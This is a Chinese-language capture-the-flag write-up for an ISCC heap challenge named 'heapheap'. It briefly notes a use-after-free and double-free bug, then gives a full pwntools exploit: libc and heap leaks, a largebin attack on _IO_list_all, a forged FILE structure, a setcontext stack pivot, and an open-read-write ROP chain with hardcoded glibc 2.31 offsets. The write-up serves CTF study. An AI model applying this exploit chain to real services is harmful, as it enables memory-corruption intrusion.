沙箱禁用execve，orw读flag

添加chunk有10的数量限制，分配的chunk大小有限制，但还是可以分配tcache，初始化使用calloc，清空堆块内容

chunk_list，chunk_size两个全局数组

edit没有检查堆块是否释放，造成UAF

free也没有检查堆块是否释放，造成double free


```
from pwn import *

context(log_level='debug', arch='amd64', os='linux')


io = process('/home/kali/pwn/ISCC/ISCC_pwn_9/heapheap')
# io = gdb.debug('/home/kali/pwn/ISCC/ISCC_pwn_9/heapheap')
# io = remote('182.92.237.102',11000)

libc = ELF('/home/kali/pwn/ISCC/ISCC_pwn_9/libc-2.31.so')


def create(index, size):
    io.sendlineafter(b'choice',b'1')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))
    io.sendlineafter(b'Size',str(size).encode(encoding='utf-8'))


def free(index):
    io.sendlineafter(b'choice',b'4')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))


def edit(index, content):
    io.sendlineafter(b'choice', b'3')
    io.sendlineafter(b'index',str(index).encode(encoding='utf-8'))
    io.sendafter(b'context', content)


def show(index):
    io.sendlineafter(b'choice', b'2')
    io.sendlineafter(b'index', str(index).encode(encoding='utf-8'))


create(0, 0x420)
create(1, 0x410)
create(2, 0x410)
create(3, 0x410)
free(0)
show(0)

# 泄露libc基址和堆基址
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96 - 0x10 - libc.symbols['__malloc_hook']
print(hex(libc_base))
io_list_all = libc_base + 0x1ed5a0

create(4, 0x430)
edit(0, b'a' * (0x10 - 1) + b'A')
show(0)
io.recvuntil(b'A')
heap_addr = u64(io.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
print(hex(heap_addr))

# fd为0x420大小largebin所在位置，因为之前create(4, 0x430)触发malloc_consodilate导致chunk0进入了largebin
fd = libc_base + 0x1ecfd0
payload = p64(fd) * 2 + p64(heap_addr) + p64(io_list_all - 0x20) # 
edit(0, payload)

# 使chunk2进入largebin，进入是利用上一步布置的指针
free(2)
create(5, 0x470)
free(5)

open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
setcontext_addr = libc_base + libc.sym['setcontext']

pop_rdi_ret = libc_base + 0x0000000000023b6a
pop_rsi_ret = libc_base + 0x000000000002601f
pop_rdx_r12_ret = libc_base + 0x0000000000119431
ret_addr = libc_base + 0x0000000000022679

chunk_small = heap_addr + 0x850
print(hex(chunk_small))
IO_wfile_jumps = libc_base + 0x1e8f60
fakeIO_addr = chunk_small
orw_add = fakeIO_addr + 0x200
A = fakeIO_addr + 0x40
B = fakeIO_addr + 0xe8 + 0x40 - 0x68

fake_IO = b''
fake_IO = fake_IO.ljust(0x18, b'\x00')
fake_IO += p64(1)
fake_IO = fake_IO.ljust(0x78, b'\x00')
fake_IO += p64(fakeIO_addr)
fake_IO = fake_IO.ljust(0x90, b'\x00')
fake_IO += p64(fakeIO_addr + 0x40)
fake_IO = fake_IO.ljust(0xc8, b'\x00')
fake_IO += p64(IO_wfile_jumps)
fake_IO += p64(orw_add) + p64(ret_addr) + b'\x00' * 0x30
fake_IO += p64(fakeIO_addr + 0xe8 + 0x40 - 0x68) + p64(setcontext_addr + 61)

flag_add = orw_add + 0x100 + 0x10

orw = p64(pop_rdi_ret) + p64(flag_add) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)
orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_add) + p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) + p64(read_addr)
orw += p64(pop_rdi_ret) + p64(1) + p64(write_addr)

payload = fake_IO
payload = payload.ljust(0x200 - 0x10, b'\x00')
payload += orw
payload = payload.ljust(0x300, b'\x00')
payload += b'flag\x00'

edit(2, payload)

# io.recvuntil(b'choice')
# io.sendline(b'5')

gdb.attach(io)
io.interactive()
```
